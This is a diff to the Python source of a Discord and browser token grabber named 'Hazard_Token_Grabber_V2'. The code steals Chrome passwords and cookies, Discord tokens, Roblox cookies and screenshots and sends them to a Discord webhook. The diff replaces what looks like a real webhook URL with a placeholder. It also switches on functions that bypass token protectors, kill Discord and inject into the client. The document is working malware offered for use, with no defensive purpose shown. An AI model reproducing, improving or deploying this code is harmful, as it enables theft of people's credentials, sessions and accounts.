@@ -17,7 +17,7 @@ from Crypto.Cipher import AES
 
 class Hazard_Token_Grabber_V2:
     def __init__(self):
-        self.webhook = "https://discord.com/api/webhooks/952913467411689512/WbohpTWQ0u9em9CYBZFE23SwRlMfFohI3Ec3Vj5MOcFUGrs2HqywgisTz1TZF5dx4Bca" #replace WEBHOOK_HERE with your webhook
+        self.webhook = "WEBHOOK_HERE" #replace WEBHOOK_HERE with your webhook
 
         self.baseurl = "https://discord.com/api/v9/users/@me"
         self.appdata = os.getenv("localappdata")
@@ -37,15 +37,15 @@ class Hazard_Token_Grabber_V2:
         self.discord_psw = []
         self.backup_codes = []
         
-        # self.bypassBetterDiscord()
-        # self.bypassTokenProtector()
+        self.bypassBetterDiscord()
+        self.bypassTokenProtector()
         if not os.path.exists(self.appdata+'\\Google\\Chrome\\User Data') or not os.path.exists(self.appdata+'\\Google\\Chrome\\User Data\\Local State'):
             self.files += f"{os.getlogin()} doesn't have google installed\n"
         else:
             self.grabPassword()
             self.grabCookies()
         Thread(target=self.screenshot).start()
-        # Thread(target=self.killDiscord).start()
+        Thread(target=self.killDiscord).start()
         self.grabTokens()
         self.neatifyTokens()
         self.grabRobloxCookie()
@@ -65,7 +65,7 @@ class Hazard_Token_Grabber_V2:
                             print("ok")
 
         self.SendInfo()
-        # self.Injection()
+        self.Injection()
         shutil.rmtree(self.tempfolder)
         
     def getheaders(self, token=None, content_type="application/json"):
@@ -247,7 +247,7 @@ class Hazard_Token_Grabber_V2:
         except Exception:
             pass
         if self.robloxcookies:
-            with open(self.tempfolder+"\\Roblox Cookie.txt", "w") as f:
+            with open(self.tempfolder+"\\Roblox Cookies.txt", "w") as f:
                 for i in self.robloxcookies: f.write(i+'\n')
 
     def grabTokens(self):
